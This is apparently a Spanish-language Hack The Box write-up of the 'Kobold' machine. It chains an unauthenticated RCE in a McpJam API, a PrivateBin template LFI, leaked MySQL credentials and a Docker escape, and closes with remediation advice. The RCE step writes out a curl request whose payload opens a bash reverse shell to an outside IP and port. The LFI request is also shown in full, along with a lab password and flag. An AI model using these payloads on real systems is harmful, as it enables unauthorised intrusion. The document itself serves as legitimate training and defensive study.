---
layout: single
title: "HTB Kobold - Writeup"
date: 2026-04-10
difficulty: Easy
operating_system: Linux
service_hint: MCP Jam API + PrivateBin
summary: "Cadena de explotación: RCE en McpJam → LFI en PrivateBin → Lectura de credenciales → Escape de contenedor Docker. Máquina Easy de HTB."
---

# 🔒 HTB Kobold — Writeup

## Información General

| Campo | Valor |
|-------|-------|
| **IP** | 10.129.31.14 |
| **Sistema Operativo** | Linux (Ubuntu) |
| **Dificultad** | Easy |
| **Tags** | MCPJam, PrivateBin, RCE, Arcane, LFI |

---

## 1. Reconocimiento

Puertos detectados:

```
PORT     STATE SERVICE
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu
80/tcp   open  http     nginx 1.24.0
443/tcp  open  https   nginx 1.24.0
3552/tcp open  taserver Golang net/http server
```

Subdominios descubiertos mediante fuzzing:

- `bin.kobold.htb` → PrivateBin
- `mcp.kobold.htb` → McpJam

---

## 2. Explotación inicial — RCE en McpJam

El endpoint `/api/mcp/connect` en `mcp.kobold.htb` permite ejecución remota de comandos sin autenticación.

```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash", 
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.191/4444 0>&1"],
      "env": {}
    },
    "serverId": "mytest"
  }'
```

Obtenemos shell como usuario `ben`.

---

## 3. Escalada de privilegios

### 3.1 LFI en PrivateBin

Abusamos del parámetro `template` en la cookie para lograr Local File Inclusion:

```bash
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=id"
```

Ejecutamos como `www-data`.

### 3.2 Lectura de credenciales

Del archivo `/srv/cfg/conf.php` extraemos credenciales MySQL:

```
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
```

### 3.3 Escape de contenedor Docker

Usamos las credenciales para crear un contenedor malicioso con mount al filesystem del host y obtenemos acceso como root.

---

## 4. Flags

- **User:** `9c731e2ffc283b2f84828df8f60cdaed`
- **Root:** Obtenida mediante container escape

---

## 5. Cadena de explotación

```
[1] RCE via McpJam API        → ben user
    ↓
[2] LFI via PrivateBin       → www-data  
    ↓
[3] Lectura de credenciales  → creds MySQL
    ↓
[4] Docker container escape → root
```

---

## 6. Lecciones aprendidas

- **RCE sin auth** en APIs es crítico — siempre validar y autorizar.
- **LFI** en aplicaciones web puede escalar a ejecución remota combinada con otras vulnerabilidades.
- **Credenciales en texto plano** son un vector directo a escalada.
- **Contenedores mal configurados** pueden ser vector de escape al host.

---

## 7. Recomendaciones de remediación

1. **McpJam:** Validar entrada y añadir authentication en `/api/mcp/connect`.
2. **PrivateBin:** Sanitizar parámetro `template` y validar rutas.
3. **Credenciales:** Usar secrets manager y rotar claves cada 90 días.

---

*Writeup preparado por Álex Pasalamar Serrano — Abril 2026*